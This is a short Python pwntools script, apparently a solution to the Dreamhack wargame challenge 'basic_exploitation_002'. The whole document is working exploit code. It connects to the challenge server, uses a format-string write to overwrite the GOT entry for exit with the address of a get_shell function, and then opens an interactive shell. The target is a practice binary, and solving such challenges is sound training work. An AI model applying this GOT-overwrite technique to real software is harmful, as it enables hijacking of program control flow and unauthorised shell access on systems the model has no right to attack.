from pwn import *

def send_payload(payload):
    print r.sendline(payload)
fmt = FmtStr(send_payload, offset = 1)

e = ELF('./basic_exploitation_002')
exit_got = e.got['exit']
get_shell = e.symbols['get_shell']

r = remote('host1.dreamhack.games', 8380)

fmt.write(exit_got, get_shell)
fmt.execute_writes()

r.interactive()
